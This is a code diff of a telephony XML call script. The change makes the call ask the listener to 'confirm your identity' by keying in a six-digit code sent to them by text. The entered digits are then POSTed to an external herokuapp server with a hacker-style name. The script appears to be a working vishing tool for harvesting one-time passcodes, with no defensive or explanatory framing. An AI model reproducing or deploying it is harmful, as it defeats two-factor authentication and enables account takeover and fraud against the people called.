@@ -1,6 +1,6 @@
 <Response>
-<Speak language="en-US" loop="2">We need to confirm your identity. Please enter the six digit code we sent you by text. When you're finished, please press #.</Speak>
-<Dial action="https://servertestbyxblackxcoder.herokuapp.com/" method="POST" callerId="3456789" redirect="false">
-    <Number>+18772427372</Number>
-</Dial>
+  <GetDigits action="https://servertestbyxblackxcoder.herokuapp.com/" method="POST">
+    <Speak language="en-US" loop="2">We need to confirm your identity. Please enter the six digit code we sent you by text. When you're finished, please press #.</Speak>
+  </GetDigits>
+  <Speak>Input not received.</Speak>
 </Response>
